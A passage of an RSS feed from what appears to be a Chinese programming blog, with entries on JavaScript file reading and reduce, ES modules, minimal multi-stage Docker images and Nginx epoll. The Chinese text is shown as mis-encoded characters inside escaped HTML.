&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            .reduce&lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;curr, next&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; curr + next&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        console.log&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;RESULT: &amp;#39;&lt;/span&gt;, result&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¶…çº§ç®€å•å§&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20220524155746288&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20220522-javascirpts_fs/image-20220524155746288.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å…³é”®å°±æ˜¯ä¸Šé¢çš„é“¾å¼è°ƒç”¨&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;split ç”¨æ¥åˆ†å‰²æ¯ä¸€è¡Œ&lt;/li&gt;
&lt;li&gt;filter ç”¨æ¥å»æ‰ç©ºè¡Œ&lt;/li&gt;
&lt;li&gt;map ç”¨æ¥æŠŠæ¯ä¸€è¡Œéƒ½è½¬åŒ–æˆæ•´æ•°&lt;/li&gt;
&lt;li&gt;reduce ç”¨æ¥æ±‚å’Œ&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>javascriptsä¸­çš„module</title>
      <link>https://rendoumi.com/posts/20220521-javascripts_module/</link>
      <pubDate>Sat, 21 May 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20220521-javascripts_module/</guid>
      <description>&lt;h4 id=&#34;javascript-module-æ˜¯ä»€ä¹ˆ&#34;&gt;JavaScript Module æ˜¯ä»€ä¹ˆ&lt;/h4&gt;
&lt;p&gt;ä¸€ä¸ª JavaScript &lt;strong&gt;module&lt;/strong&gt; æ¨¡å—å‡†ç¡®çš„è¯´å°±æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œå®ƒå…è®¸ä½ æŠŠä»£ç  export å¯¼å‡ºæ¥å¤ç”¨ï¼Œè¿™æ ·åˆ«çš„ JavaScript æ–‡ä»¶å¯ä»¥ import è¿™ä¸ªæ–‡ä»¶æŠŠå®ƒä½œä¸ºåº“æ–‡ä»¶æ¥ä½¿ç”¨äº†ã€‚&lt;/p&gt;
&lt;p&gt;æ¨¡å—ä¸»è¦æ˜¯ç”¨åœ¨å·¥ç¨‹æ–‡ä»¶ä¸­ï¼Œç”¨æ¥æŠŠä»£ç å…±äº«ç»™å…¶ä»–æ–‡ä»¶ç”¨ï¼Œjavascipt çš„æ¨¡å—å¯ä»¥è¯´æ˜¯æ»¡å¤©é£ã€‚&lt;/p&gt;
&lt;p&gt;è¿™é‡Œå‘¢è®¨è®ºçš„æ˜¯å‰ç«¯çš„éƒ¨åˆ†ï¼Œå³æ˜¯è¿è¡Œåœ¨æµè§ˆå™¨ä¸­çš„ javascripts module éƒ¨åˆ†ï¼Œè€Œä¸æ˜¯è¿è¡Œåœ¨åç«¯çš„ Node.js çš„éƒ¨åˆ†ï¼Œåç«¯ç°åœ¨å·²ç»å‘å‰ç«¯é æ‹¢äº†ã€‚&lt;/p&gt;
&lt;p&gt;ES6æ ‡å‡†å‘å¸ƒåï¼Œmoduleæˆä¸ºæ ‡å‡†ï¼Œæ ‡å‡†ä½¿ç”¨æ˜¯ä»¥exportæŒ‡ä»¤å¯¼å‡ºæ¥å£ï¼Œä»¥importå¼•å…¥æ¨¡å—ï¼Œä½†æ˜¯åœ¨æˆ‘ä»¬ä¸€è´¯çš„nodeæ¨¡å—ä¸­ï¼Œæˆ‘ä»¬ä¾ç„¶é‡‡ç”¨çš„æ˜¯CommonJSè§„èŒƒï¼Œä½¿ç”¨requireå¼•å…¥æ¨¡å—ï¼Œä½¿ç”¨module.exportså¯¼å‡ºæ¥å£ã€‚è¿™ç‚¹ä¹Ÿç†è§£æ¸…æ¥šã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬ä»é›¶æ¥ä¸€æ­¥æ­¥å¼€å§‹å§&lt;/p&gt;
&lt;h4 id=&#34;å¦‚ä½•æŠŠä¸€ä¸ª-javascript-æ–‡ä»¶è½¬æ¢ä¸º-es-çš„-module&#34;&gt;å¦‚ä½•æŠŠä¸€ä¸ª JavaScript æ–‡ä»¶è½¬æ¢ä¸º ES çš„ module&lt;/h4&gt;
&lt;h5 id=&#34;1-åˆ›å»ºä¸€ä¸ª-project-ç›®å½•&#34;&gt;1: åˆ›å»ºä¸€ä¸ª project ç›®å½•&lt;/h5&gt;
&lt;p&gt;è¿™ä¸ªç›®å½•ç”¨æ¥æ”¾ HTML å’Œ JavaScript æ–‡ä»¶&lt;/p&gt;
&lt;h5 id=&#34;2-å»ºç«‹ä½ çš„-code-ä»£ç æ–‡ä»¶&#34;&gt;2: å»ºç«‹ä½ çš„ code ä»£ç æ–‡ä»¶&lt;/h5&gt;
&lt;p&gt;åœ¨ project æ–‡ä»¶å¤¹ä¸­å»ºç«‹2ä¸ªæ–‡ä»¶:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;index.html&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;index.js&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h5 id=&#34;3-æ·»åŠ -javascript-æ–‡ä»¶çš„å¼•ç”¨åˆ°-html-æ–‡ä»¶ä¸­&#34;&gt;3: æ·»åŠ  JavaScript æ–‡ä»¶çš„å¼•ç”¨åˆ° HTML æ–‡ä»¶ä¸­&lt;/h5&gt;
&lt;p&gt;æ‰“å¼€&lt;code&gt;index.html&lt;/code&gt; ç¼–è¾‘å®ƒï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;meta&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;meta&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;ES Module - zhang ranrui&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;h1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;ES Module Tutorial&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;h1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c&#34;&gt;&amp;lt;!-- Add the &amp;#34;index.js&amp;#34; JavaScript file to this HTML document --&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;module&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;index.js&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸Šé¢çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬å¼•ç”¨äº† index.js , å¹¶å®šä¹‰å®ƒ type=&amp;ldquo;module&amp;rdquo;ï¼Œè¿™æ˜¾å¼æŒ‡æ˜äº† index.js æ˜¯ä¸€ä¸ª ES çš„moduleã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>Javascriptsä¹‹æ•°ç»„çš„reduce</title>
      <link>https://rendoumi.com/posts/20220520-javascripts_reduce/</link>
      <pubDate>Fri, 20 May 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20220520-javascripts_reduce/</guid>
      <description>&lt;p&gt;ç ”ç©¶ä¸€ä¸‹ javascripts çš„ reduce ï¼Œreduce æ˜¯æ—¢èƒ½æ”¹å˜ array çš„ sizeï¼Œåˆèƒ½æ”¹å˜æ•°å€¼çš„å‡½æ•°ï¼Œfilter æ˜¯åªèƒ½æ”¹å˜sizeï¼Œä¸èƒ½æ”¹å˜æ•°å€¼ï¼›è€Œ map æ˜¯ä¸èƒ½æ”¹å˜ sizeï¼Œå¯ä»¥æ”¹å˜æ•°å€¼ã€‚å¾ˆæ‹—å£å§ï¼Œä¸‰ä¸ªå…„å¼Ÿã€‚&lt;/p&gt;
&lt;p&gt;ç®€å•ä»‹ç»ä¸€ä¸‹ reduceã€‚&lt;/p&gt;
&lt;p&gt;å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªæ•°ç»„:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬è¦å¯¹æ•´ä¸ªæ•°ç»„æ±‚å’Œ.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;reduce&lt;/code&gt; å®é™…æ˜¯æŒ‰ç…§ä¸‹åˆ—çš„ç®—å¼æ¥è¿›è¡Œæ±‚å’Œçš„:&lt;/p&gt;
&lt;p&gt;((((1) + 2) + 3) + 4)&lt;/p&gt;
&lt;p&gt;é‚£å®é™… &lt;code&gt;reduce&lt;/code&gt; å‡½æ•°æ‰§è¡Œä¸­ï¼Œä½ å¯ä»¥æŒ‰ä½ éœ€æ±‚æ¥è‡ªå®šä¹‰ä½ è‡ªå·±çš„ + æ“ä½œç¬¦ã€‚æ•°ç»„çš„å€¼ä¹Ÿå¯ä»¥æ˜¯å…¶ä»–çš„ä»»æ„ä¸œè¥¿ã€‚å¬èµ·æ¥æœ‰ç‚¹æ„æ€å§ï¼Ÿ&lt;/p&gt;
&lt;h4 id=&#34;1-reduce-æ˜¯å¹²å˜›çš„&#34;&gt;&lt;strong&gt;1ã€&lt;/strong&gt; Reduce æ˜¯å¹²å˜›çš„&lt;/h4&gt;
&lt;p&gt;åœ¨ä¸€ä¸ªå‡½æ•°å¼ç¼–ç¨‹è¯­è¨€ä¸­ï¼Œreduce å…¶å®æœ‰å¾ˆå¤šåˆ«çš„åç§°ï¼Œæ¯”å¦‚ &lt;strong&gt;foldï¼ˆå¯¹æŠ˜ï¼‰&lt;/strong&gt;, &lt;strong&gt;accumulateï¼ˆç´¯åŠ å™¨ï¼‰&lt;/strong&gt;, &lt;strong&gt;aggregateï¼ˆèšåˆå™¨ï¼‰&lt;/strong&gt;, &lt;strong&gt;compressï¼ˆå‹ç¼©ï¼‰&lt;/strong&gt; ç”šè‡³å« &lt;strong&gt;injectï¼ˆæ³¨å…¥ï¼‰&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;h4 id=&#34;2-reduce-çš„å‚æ•°&#34;&gt;&lt;strong&gt;2ã€&lt;/strong&gt; Reduce çš„å‚æ•°&lt;/h4&gt;
&lt;p&gt;å¸¸ç”¨ç”¨æ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;myArray&lt;/span&gt;      &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;/* é¦–å…ˆå®šä¹‰ä¸€ä¸ªæ•°ç»„ */&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;callbackfn&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; /* å†å®šä¹‰ä¸€ä¸ªå‡½æ•° */ &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;initialvalue&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; /* ä»»æ„ä¸€ä¸ªåˆå§‹åŒ–çš„å€¼ */ &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;myArray.reduce&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;callbackfn&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;myArray.reduce&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;callbackfn, initialValue&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;reduce&lt;/code&gt; çš„å‚æ•°å¦‚ä¸‹:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;callbackfn&lt;/code&gt;&lt;/strong&gt;: å¿…é¡»æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œä¼šåœ¨æ•´ä¸ªæ•°ç»„ä¸­åå¤è°ƒç”¨ï¼Œreduce è°ƒç”¨ callbackfn çš„æ—¶å€™æœ‰4ä¸ªå‚æ•°ï¼Œæˆ‘ä»¬å®šä¹‰å®ƒä»¬æ˜¯ &lt;code&gt;previousValue&lt;/code&gt;, &lt;code&gt;currentElement&lt;/code&gt;, &lt;code&gt;index&lt;/code&gt; å’Œ &lt;code&gt;array&lt;/code&gt; ï¼Œçœ‹èµ·æ¥åƒä¸‹é¢ä¸€æ ·:&lt;/p&gt;</description>
    </item>
    <item>
      <title>é¢è¯•ä¹‹Dockerå¦‚ä½•æ‰“å‡ºæœ€å°çš„é•œåƒ</title>
      <link>https://rendoumi.com/posts/20220401-docker_mini_image/</link>
      <pubDate>Fri, 01 Apr 2022 10:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20220401-docker_mini_image/</guid>
      <description>&lt;p&gt;é¢è¯•çš„æ—¶å€™è¢«é—®åˆ°ï¼šå¦‚ä½•æ‰èƒ½è®© docker æ‰“å‡ºçš„é•œåƒåŒ…å°½é‡å°ï¼Ÿ&lt;/p&gt;
&lt;p&gt;å…¶å®åœ¨ç”Ÿäº§å·²ç»å°½é‡ä½¿ç”¨æœ€å°åŒ–çš„é•œåƒåŒ…äº†ï¼Œåªæ˜¯çªç„¶è¢«é—®åˆ°è¿˜æ˜¯æœ‰ç‚¹æ‡µåœˆï¼›å› ä¸ºå°è±¡ä¸­è‡ªå·±åŸºæœ¬æ˜¯ä½¿ç”¨ alphine åšåº•åŒ…ï¼ŒDockerfile é€šå¸¸å°±æ˜¯ copy ä¸€ä¸ªå¯æ‰§è¡Œçš„ç¨‹åºè¿›å»å°±å®Œäº‹äº†ï¼Œå¦‚æœä¸è¡Œï¼Œå†å¼€ shell è¿›å»æ…¢æ…¢æ·»åŠ ç¼ºå°‘çš„åº“æ–‡ä»¶ã€‚&lt;/p&gt;
&lt;p&gt;è¿™é‡Œå°±æ€»ç»“ä¸€ä¸‹ï¼Œä¸¤ç‚¹ï¼š&lt;/p&gt;
&lt;h3 id=&#34;ä¸€ä½¿ç”¨å°½é‡å°çš„åº•åŒ…&#34;&gt;ä¸€ã€ä½¿ç”¨å°½é‡å°çš„åº•åŒ…&lt;/h3&gt;
&lt;p&gt;ä»¥ alphine ä¸ºä¸»ï¼Œä½¿ç”¨ alphine åº•åŒ…çš„æ—¶å€™ï¼Œéœ€è¦æ³¨æ„ä»¥ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;1ã€æ›¿æ¢ apk çš„æº&lt;/p&gt;
&lt;p&gt;2ã€æ›´æ–°ã€æ›´æ–°è¯ä¹¦&lt;/p&gt;
&lt;p&gt;3ã€æ³¨æ„ Timezone çš„è®¾ç½®&lt;/p&gt;
&lt;p&gt;4ã€æ³¨æ„ glibc åº“çš„å…¼å®¹é—®é¢˜&lt;/p&gt;
&lt;h3 id=&#34;äºŒä½¿ç”¨åˆ†é˜¶æ®µbuild&#34;&gt;äºŒã€ä½¿ç”¨åˆ†é˜¶æ®µbuild&lt;/h3&gt;
&lt;p&gt;é€šå¸¸ç±»ä¼¼cã€goã€rustä¹‹ç±»çš„æºä»£ç ï¼Œéƒ½éœ€è¦ç»è¿‡ç¼–è¯‘ï¼Œæœ€åäº§ç”Ÿå¯æ‰§è¡Œæ–‡ä»¶ï¼Œé‚£ä¹ˆå®Œæ•´çš„ç¼–è¯‘ç¯å¢ƒå…¶å®å¯¹æœ€åçš„é•œåƒæ¥è¯´éƒ½æ˜¯ä¸éœ€è¦çš„ã€‚&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥åˆ©ç”¨åˆ†é˜¶æ®µbuildï¼Œç”©è„±ç¼–è¯‘ç¯å¢ƒä»¥åŠä¸­é—´äº§ç‰©ï¼Œå°±å¯ä»¥ç¼©å°æœ€å build å‡ºé•œåƒçš„å¤§å°ï¼Œä½¿ç”¨ä¹Ÿå¾ˆç®€å•ã€‚&lt;/p&gt;
&lt;p&gt;Dockerfile æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;FROM golang:alpine AS build-env
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;WORKDIR /app
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ADD . /app
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;RUN &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /app &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; go build -o goapp
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;FROM alpine
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;RUN apk update &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;   apk add ca-certificates &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;   update-ca-certificates &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;   rm -rf /var/cache/apk/*
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;WORKDIR /app
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;COPY --from&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;build-env /app/goapp /app
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;EXPOSE &lt;span class=&#34;m&#34;&gt;8080&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ENTRYPOINT ./goapp
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>é¢è¯•ä¹‹Nginxçš„epollçš„ä¼˜åŠ¿</title>
      <link>https://rendoumi.com/posts/20220401-nginx_epoll/</link>
      <pubDate>Fri, 01 Apr 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20220401-nginx_epoll/</guid>
      <description>&lt;p&gt;é¢è¯•æ—¶è¢«é—®åˆ°ï¼šæ˜¯å¦äº†è§£ Nginxï¼Œå®ƒä½¿ç”¨çš„ epoll æ¨¡å¼å’Œå…¶ä»–çš„ç›¸æ¯”æœ‰ä»€ä¹ˆä¼˜åŠ¿ï¼Ÿ&lt;/p&gt;
&lt;p&gt;ç›´æ¥è¢«é—®ä½ï¼Œå®é™…ç”Ÿäº§ä¸­é…è¿‡ä¸å°‘çš„ Nginxï¼Œå„ç§ rewriteã€regexã€æ­£åå‘ä»£ç†ã€phpã€fast-cgiã€é™æµã€è¯ä¹¦ã€jwtã€corsï¼›epoll åªå¤§æ¦‚æœ‰å°è±¡æ˜¯ä¸‹é¢è¿™è¡Œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;events &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    use epoll&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    worker_connections  1024&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
